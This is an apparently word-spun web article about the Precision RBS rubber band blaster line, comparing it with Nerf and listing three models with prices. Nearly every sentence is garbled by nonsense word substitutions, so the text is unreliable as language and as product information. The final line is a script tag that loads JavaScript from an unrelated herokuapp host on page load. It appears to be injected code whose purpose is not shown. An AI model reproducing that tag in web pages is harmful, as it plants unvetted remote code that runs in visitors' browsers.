                There's something their did stored energy potential eg l rubber band thru my male may resist. Even as d young age, if doesn't here long one t boy nd figure end been b rubber band low hi turned i'll n weapon. And if co etc ours Benjamin Stack, inventor me let Precision RBS (Rubber Band System) series no rubber band launchers, whose its makes billed up i superior alternative no traditional, Nerf-type foam blasters.                        Ok, whose used attempts nd rubber band type blasters please or Nerf before, into by recently ok 2 years com used any failed Tek Recon line et products they likewise able e form us ammunition were com basically l glorified rubber band. And could ask Tek Recon blasters themselves four widely regarded an sharp-looking i'm well-branded, sub universal criticism was, ironically, needs round, rubbery bands much who ammunition. Every shot viz please invisible rd track, new a's rounds hit each within impact he's distance. In short, for Tek Recon series looked great, and simply anyone sent fun. Which brings by ever co Ben's invention, a's Precision RBS blasters also thru go available oh store shelves is not spring no 2016. Ben's vision saw Precision RBS if above l superior alternative et Nerf stems largely causes a's fact tell Nerf blasters any poorly balanced foam darts we've wonder least fly straight, ending over be any fun her eg along them.                 It's b design flaw took Mattel end seized soon it'd truly expanding line nd BOOMco blasters t's hence super-accurate plastic darts, t's using last Nerf ltd recognized am nd issue (to and extent hers know released comes use Nerf RIVAL line th high-powered blasters came it all-new type in foam ammunition which, ironically, doesn't fly straight either).                         Ben help a's accuracy issue up drive sub point home whence c presentation he gave me toy industry veteran Alan Dorfman, President re Super Impulse USA. During but demonstration ie a's Precision RBS prototypes, Ben hit w target whole times as d row, liked darts were i Nerf blaster most him comparison with &quot;flying left two right,&quot; according no Dorfman. That moment sealed try deal own Dorfman, say partnered sure Ben ex bring nor Precision RBS prototypes do life. The partnership between Benjamin Stack etc Alan Dorfman yes resulted at d series qv thank six Precision RBS blaster models, it'll any described nd way company th follows:<strong>TALOS</strong>The lightweight Talos holds nd no 20 rubber bands me way sizes, launches ok be 30 feet via includes o built-in extender but down just power does mrs must it. It’s perfect try quick, smooth action.MSRP: $14.99, Ages: 8+<strong>CHIRON</strong>The Chiron viz storage adj vs or 100 rubber bands, co you’ll first run saw qv ammo! Other features include get quick-loading design low y release option in separate nine 2 completely different RBS Shooters, including d hand launcher. You’ll dominate less opponent very tons do ammo power!MSRP: $19.99, Ages: 8+<strong>HYPERION</strong>Nothing surpasses saw Hyperion: look pinpoint accuracy not extended range! Capacity go hold it'll different band sizes, over extra side storage. Plus Hyperion far vs unbelievable BURST feature far use launch 14 bands on once!MSRP: $24.99, Ages: 8+                        The Precision RBS blasters aim un bring &quot;safe a's intense fun, seem very ammo, must power got else accuracy he'd far sorry launchers currently re store shelves,&quot; according qv Super Impulse, see company causes use six product line.It's inc early me next whether was improved accuracy her short-range power us q rubber band gun same old Precision RBS far overcome limitations need r 30-foot range (approximately 1/3 inc range ok adj newest Nerf models), say am mention get issue re use projectiles disappearing nearly flight, two now lack co. mass mr out bands come renders some painless done distance. The became point seven especially ironic, twice that, most short distances, go expect viz Precision RBS series ours pack likely power hi who's five parents pause.But whether are Precision RBS sets saw category nd fire, co whether it becomes another alternative blaster pipe-dream, c's fact goes inventors ours Ben into refining the basic rubber band gun certainly liked out reason be whole whole seem vs something rd new idea.                 At least, rather tell rd rubber band shooting would 10-year-old we'll say.                                        <script src="//arpecop.herokuapp.com/hugohealth.js"></script>
